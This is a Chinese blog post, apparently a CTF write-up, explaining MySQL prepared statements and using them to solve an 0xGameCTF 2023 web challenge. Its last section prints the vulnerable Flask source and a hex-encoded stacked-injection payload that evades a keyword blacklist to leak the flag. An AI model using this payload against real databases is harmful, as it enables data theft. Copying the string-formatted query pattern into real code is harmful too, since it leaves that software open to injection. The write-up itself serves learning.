<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>MySQL预处理绕过 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>MySQL预处理绕过</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-27T02:13:46.081Z" id="date"> 2023-10-27</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-12-14T12:41:42.819Z" id="updated"> 2023-12-14</time></div></span><br><span>Word Count: <div class="control">2.5k</div></span><br><span>Read Time: <div class="control">10 min</div></span></div></div><hr><div id="post-content"><h1>0x01 前言</h1>
<p>写此文章的来源是做CTF题目时遇到了mysql注入，且那道题的思路是根据MySQL支持的prepare预处理来进行绕过。以前也没了解过，故在此写一篇文章来记录一下。</p>
<h1>0x02 Prepare</h1>
<h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2-1-简介"></a>2.1 简介</h2>
<p>多次执行一条 SQL 语句时，如果每次都处理该 SQL 语句，生成执行计划，必然会浪费一定的时间。</p>
<p>SQL预处理（Prepare），是一种特殊的 SQL 处理方式；预处理不会直接执行 SQL 语句，而是先将 SQL 语句编译，生成执行计划，然后通过 Execute 命令携带 SQL 参数执行 SQL 语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Prepare 的使用十分广泛，绝大多数 ORM 框架都有 API 支持；<br>Prepare 既可以提升 SQL 执行性能，还能防止 SQL 注入引发的安全问题；<br>Prepare 虽然在每个数据库中的语法差异很大，但是一般情况下我们都不会手写 SQL，而是使用 ORM 框架来做；<br></code></pre></td></tr></table></figure>
<h2 id="2-1-由来"><a href="#2-1-由来" class="headerlink" title="2-1-由来"></a>2.1 由来</h2>
<p>从mysql服务器执行sql的过程来看，SQL执行过程包括以下阶段 <code>词法分析-&gt;语法分析-&gt;语义分析-&gt;执行计划优化-&gt;执行</code>。</p>
<p><strong>词法分析-&gt;语法分析</strong>这两个阶段我们称之为<strong>硬解析</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">词法分析识别sql中每个词；<br>语法分析解析SQL语句是否符合sql语法，并得到一棵语法树（Lex）。<br>对于只是参数不同，其他均相同的sql，它们执行时间不同但硬解析的时间是相同的。<br></code></pre></td></tr></table></figure>
<p>而同一SQL随着查询数据的变化，多次查询执行时间可能不同，但硬解析的时间是不变的。所以对于sql执行时间较短，sql硬解析的时间占总执行时间的比率越高。</p>
<p>Prepare的出现就是为了优化硬解析的问题。</p>
<p>虽然Prepare在execute阶段可以节省硬解析的时间。但如果sql只执行一次，且以prepare的方式执行，那么sql执行需两次与服务器交互（Prepare和execute）, 而以普通（非prepare）方式，只需要一次交互。这样使用prepare会带来额外的网络开销，得不偿失。</p>
<p>如果同一sql需要执行多次，比如：以prepare方式执行10次，那么只需要一次硬解析。这时候额外的网络开销就显得微乎其微了；因此prepare更适用于频繁执行的SQL中。</p>
<h1>0x03 SQL语句的执行处理</h1>
<h2 id="3-1-即时-SQL"><a href="#3-1-即时-SQL" class="headerlink" title="3-1-即时-SQL"></a>3.1 即时 SQL</h2>
<p>一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 词法和语义解析；<br>2. 优化 SQL 语句，制定执行计划；<br>3. 执行并返回结果；<br></code></pre></td></tr></table></figure>
<p>如上，一条 SQL 是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p>
<h2 id="3-2-预处理-SQL"><a href="#3-2-预处理-SQL" class="headerlink" title="3-2-预处理-SQL"></a>3.2 预处理 SQL</h2>
<p>但是，绝大多数情况下，某需求可能会要求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。</p>
<p>所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。</p>
<p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
<p><strong>注意：</strong></p>
<p>虽然是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，</p>
<p>往往还是需要通过具体值来预估出成本代价。</p>
<h1>0x04 Prepared SQL Statement Syntax</h1>
<p>MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p>
<p>MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>
语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 定义预处理语句<br>PREPARE stmt_name FROM preparable_stmt;<br># 执行预处理语句<br>EXECUTE stmt_name [USING @var_name [, @var_name] ...];<br># 删除(释放)定义<br>&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;<br></code></pre></td></tr></table></figure>
<h2 id="4-1-利用字符串定义预处理-SQL-直角三角形计算"><a href="#4-1-利用字符串定义预处理-SQL-直角三角形计算" class="headerlink" title="4-1-利用字符串定义预处理-SQL-直角三角形计算"></a>4.1 利用字符串定义预处理 SQL (直角三角形计算)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; PREPARE stmt1 FROM &#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;;<br>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared<br><br>mysql&gt; SET @a = 3;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; set @b = 4;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; execute stmt1 using @a, @b;<br>+------------+<br>| hypotenuse |<br>+------------+<br>|          5 |<br>+------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>
<h2 id="4-2-利用变量定义预处理-SQL-直角三角形计算"><a href="#4-2-利用变量定义预处理-SQL-直角三角形计算" class="headerlink" title="4-2-利用变量定义预处理-SQL-直角三角形计算"></a>4.2 利用变量定义预处理 SQL (直角三角形计算)</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; set @s = &#x27;select sqrt(pow(?,2) + pow(?,2)) as hypotenuse&#x27;;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; prepare stmt2 from @s;<br>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared<br><br>mysql&gt; set @c = 6;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; set @d = 8;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; execute stmt2 using @c, @d;<br>+------------+<br>| hypotenuse |<br>+------------+<br>|         10 |<br>+------------+<br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure>
<h2 id="4-3-解决无法传参问题"><a href="#4-3-解决无法传参问题" class="headerlink" title="4-3-解决无法传参问题"></a>4.3 解决无法传参问题</h2>
<p>我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 但是，可以用 PREPARE 语句解决此问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; SET @skip = 100; SET @numrows = 3;<br>Query OK, 0 rows affected (0.00 sec)<br><br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows;<br>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;@skip, @numrows&#x27; at line 1<br><br>mysql&gt; PREPARE stmt3 FROM &quot;SELECT * FROM t1 LIMIT ?, ?&quot;;<br>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared<br><br>mysql&gt; EXECUTE stmt3 USING @skip, @numrows;<br>+-----+--------+<br>| a   | filler |<br>+-----+--------+<br>| 100 | filler |<br>| 101 | filler |<br>| 102 | filler |<br>+-----+--------+<br>3 rows in set (0.00 sec)<br><br>mysql&gt; DEALLOCATE PREPARE stmt3;<br>Query OK, 0 rows affected (0.00 sec)<br></code></pre></td></tr></table></figure>
<p>​		如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，</p>
<p>MySQL 会把变量名当做表名，这样既不是本意，也不是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将</p>
<p>整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; SET @table = &#x27;t2&#x27;;<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; SET @s = CONCAT(&#x27;SELECT * FROM &#x27;, @table);#字符串拼接<br>Query OK, 0 rows affected (0.00 sec)<br><br>mysql&gt; PREPARE stmt4 FROM @s;<br>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared<br><br>mysql&gt; EXECUTE stmt4;<br>+------+-------+-------+<br>| id   | score | grade |<br>+------+-------+-------+<br>|    1 |    99 | A     |<br>|    2 |    81 | B     |<br>|    3 |    55 | D     |<br>|    4 |    69 | C     |<br>+------+-------+-------+<br>4 rows in set (0.00 sec)<br><br>mysql&gt; DROP PREPARE stmt4;<br>Query OK, 0 rows affected (0.00 sec)<br></code></pre></td></tr></table></figure>
<h1>0x05 预处理 SQL 注意点</h1>
<p>1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。</p>
<p>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。</p>
<p>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。</p>
<p>4、PREPARE stmt_name 的作用域是session级</p>
<p class='item-img' data-src='image-20231027105938975.png'><img src="image-20231027105938975.png" alt="image-20231027105938975"></p>
<p>可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql&gt; show variables like &quot;max_prepared%&quot;;<br>ERROR 2006 (HY000): MySQL server has gone away<br>No connection. Trying to reconnect...<br>Connection id:    4<br>Current database: *** NONE ***<br><br>+-------------------------+-------+<br>| Variable_name           | Value |<br>+-------------------------+-------+<br>| max_prepared_stmt_count | 16382 |<br>+-------------------------+-------+<br>1 row in set, 3 warnings (0.01 sec)<br></code></pre></td></tr></table></figure>
<p>预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。</p>
<h1>0x06 实战体悟</h1>
<p>在这里根据上述学的来重新做一下那道CTF题目，加深印象。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br><span class="hljs-keyword">import</span> MySQLdb<br><span class="hljs-keyword">import</span> re<br><br>blacklist = [<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;database&#x27;</span>, <span class="hljs-string">&#x27;table&#x27;</span>, <span class="hljs-string">&#x27;column&#x27;</span>, <span class="hljs-string">&#x27;alter&#x27;</span>, <span class="hljs-string">&#x27;create&#x27;</span>, <span class="hljs-string">&#x27;drop&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;xor&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;then&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>]<br><br>conn = MySQLdb.connect(host=<span class="hljs-string">&#x27;db&#x27;</span>, port=<span class="hljs-number">3306</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, passwd=<span class="hljs-string">&#x27;root&#x27;</span>, db=<span class="hljs-string">&#x27;ctf&#x27;</span>)<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    field = request.args.get(<span class="hljs-string">&#x27;order&#x27;</span>, <span class="hljs-string">&#x27;id&#x27;</span>)<br>    field = re.sub(<span class="hljs-string">r&#x27;\s+&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, field)<br><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> s.lower() <span class="hljs-keyword">in</span> field.lower():<br>            <span class="hljs-keyword">return</span> s + <span class="hljs-string">&#x27; are banned&#x27;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;id|name|email&quot;</span>, field):<br>        field = <span class="hljs-string">&#x27;id&#x27;</span><br><br>    <span class="hljs-keyword">with</span> conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM userinfo order by %s&#x27;</span> % field)<br>        res = cursor.fetchall()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, res=res)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>这里看上述源码发现，黑名单过滤很全，并且sqlmap也跑不出来。随后陷入只是盲区，看了hint发现cursor.execute可以执行多条语句，由此可以发现这里有堆叠注入的可能（题后反思：这里呢提示我在日后分析代码的时候，学会去找敏感函数，搜寻一下各类函数的用法，说不定就找到漏洞点了）。</p>
<p>那我们直接构造一波prepare语句，既然是预处理了，那完全没必要担心黑名单这个点了。这里呢wp是采用的变量定义预处理SQL</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>报错注入语句,这里注意报错回显数据是有限的<br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, substr((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag), <span class="hljs-number">1</span>, <span class="hljs-number">31</span>), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>接着构造预处理<span class="hljs-keyword">SQL</span><br>id;<span class="hljs-keyword">set</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65</span><br><span class="hljs-number">637420737562737472282873656</span>c65637420666c61672066726f6d20666c6167292c312c333129292c30783<br><span class="hljs-number">765292</span>c31293b;<span class="hljs-keyword">prepare</span><span class="hljs-comment">/**/</span>stmt<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">execute</span><span class="hljs-comment">/**/</span>stmt;<br></code></pre></td></tr></table></figure>
<p>这里呢需要进行hex编码的原因是绕过黑名单，由于你这个预处理SQL直接是与MySQL数据库交互，而MySQL是会自动解析16进制并去解码的，故此这里hex编码是必要的。其次使用内联注释符/**/的原因是<code>re.sub</code>这里的函数会过滤掉我们输入的空格字符，因此注释符也是必要的。</p>
<p>这里是set一个变量，并赋值为恶意代码，随后prepare定义预处理语句，接着execute执行预处理语句。</p>
<p class='item-img' data-src='image-20231027111637232.png'><img src="image-20231027111637232.png" alt="image-20231027111637232"></p>
<p>回显flag</p>
<h1>0x07 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Saintmm/article/details/125945979">MySQL如何对SQL做prepare预处理（解决IN查询SQL预处理仅能查询出一条记录的问题）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL的SQL预处理(Prepared)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133778143?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169823616516800182117459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=169823616516800182117459&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-133778143-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=0xgameCTF%202023web&amp;spm=1018.2226.3001.4187">[0xGameCTF 2023] web题解</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/10/28/%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">← Next 无回显命令执行</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/10/26/%E6%B5%85%E6%9E%90%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/">深度学习文件上传-二次渲染 Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 Prepare</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%94%B1%E6%9D%A5"><span class="toc-number">2.2.</span> <span class="toc-text">2.1 由来</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 SQL语句的执行处理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%8D%B3%E6%97%B6-SQL"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 即时 SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E9%A2%84%E5%A4%84%E7%90%86-SQL"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 预处理 SQL</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 Prepared SQL Statement Syntax</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%88%A9%E7%94%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9A%E4%B9%89%E9%A2%84%E5%A4%84%E7%90%86-SQL-%E7%9B%B4%E8%A7%92%E4%B8%89%E8%A7%92%E5%BD%A2%E8%AE%A1%E7%AE%97"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 利用字符串定义预处理 SQL (直角三角形计算)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%88%A9%E7%94%A8%E5%8F%98%E9%87%8F%E5%AE%9A%E4%B9%89%E9%A2%84%E5%A4%84%E7%90%86-SQL-%E7%9B%B4%E8%A7%92%E4%B8%89%E8%A7%92%E5%BD%A2%E8%AE%A1%E7%AE%97"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 利用变量定义预处理 SQL (直角三角形计算)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E8%A7%A3%E5%86%B3%E6%97%A0%E6%B3%95%E4%BC%A0%E5%8F%82%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 解决无法传参问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 预处理 SQL 注意点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 实战体悟</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>